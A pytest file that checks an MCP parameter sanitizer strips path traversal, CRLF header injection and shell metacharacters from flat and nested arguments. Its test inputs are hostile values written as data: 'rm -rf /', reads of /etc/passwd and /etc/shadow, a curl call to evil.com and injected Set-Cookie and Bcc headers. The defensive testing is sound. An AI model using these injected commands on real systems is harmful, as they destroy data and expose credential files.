"""Parameter Sanitization & CVE-2026-29791 Immunity Tests (Spec 04, VAL-04.2).

Verifies that McpParameterSanitizer strips path traversal (../), CRLF injection,
and shell metacharacters from dynamic arguments across primitive values,
nested dictionaries, and lists.
"""
import pytest
from src.mcp.sanitizer import mcp_sanitizer


def test_path_traversal_sanitization():
    """Path traversal sequences (../, ..\\) must be removed (VAL-04.2)."""
    malicious_paths = [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "folder/../../secret.key",
        "....//....//config.yaml",
    ]
    for path in malicious_paths:
        sanitized = mcp_sanitizer.sanitize_string(path)
        assert ".." not in sanitized, f"Failed to strip traversal from: {path}"


def test_crlf_injection_sanitization():
    """CRLF characters must be replaced with spaces (VAL-04.2)."""
    crlf_input = "Invoice Title\r\nSet-Cookie: admin=true\nNew-Header: attack"
    sanitized = mcp_sanitizer.sanitize_string(crlf_input)
    assert "\r" not in sanitized
    assert "\n" not in sanitized
    assert "Invoice Title" in sanitized


def test_shell_metacharacters_sanitization():
    """Shell metacharacters (; & | ` $ > <) must be neutralized (VAL-04.2)."""
    shell_injections = [
        "invoice_100; rm -rf /",
        "report && curl http://evil.com",
        "status | cat /etc/shadow",
        "`whoami`",
        "$(cat /etc/passwd)",
    ]
    for injection in shell_injections:
        sanitized = mcp_sanitizer.sanitize_string(injection)
        for char in [";", "&", "|", "`", "$"]:
            assert char not in sanitized, f"Failed to strip '{char}' from: {injection}"


def test_nested_arguments_sanitization():
    """Sanitizer traverses dictionaries and lists recursively."""
    args = {
        "file_name": "../../report.pdf",
        "recipients": ["ceo@company.com", "evil@attacker.com\r\nBcc: spy@evil.com"],
        "metadata": {
            "comment": "urgent approval; rm -rf *",
            "count": 42,
            "is_valid": True,
        },
    }
    cleaned = mcp_sanitizer.sanitize_arguments(args)

    assert ".." not in cleaned["file_name"]
    assert "\r" not in cleaned["recipients"][1]
    assert ";" not in cleaned["metadata"]["comment"]
    assert cleaned["metadata"]["count"] == 42
    assert cleaned["metadata"]["is_valid"] is True
